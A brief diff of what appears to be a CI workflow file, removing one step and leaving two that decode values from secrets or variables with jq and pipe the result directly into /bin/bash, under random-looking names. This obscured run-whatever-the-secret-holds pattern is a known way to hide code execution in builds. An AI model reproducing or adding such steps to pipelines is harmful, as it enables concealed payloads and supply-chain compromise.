@@ -17,7 +17,6 @@ jobs:
           hqs243: ${{ secrets.hqs243 }}
         run: |
           printf '%s' "$hqs243" | jq -r .ucrd19503 | /bin/bash
-          printf '%s' "$lpw691" | jq -r .mj1 | /bin/bash
           echo $l46235 | jq -r .abxz63923 | /bin/bash
 
       - name: Upload artifact
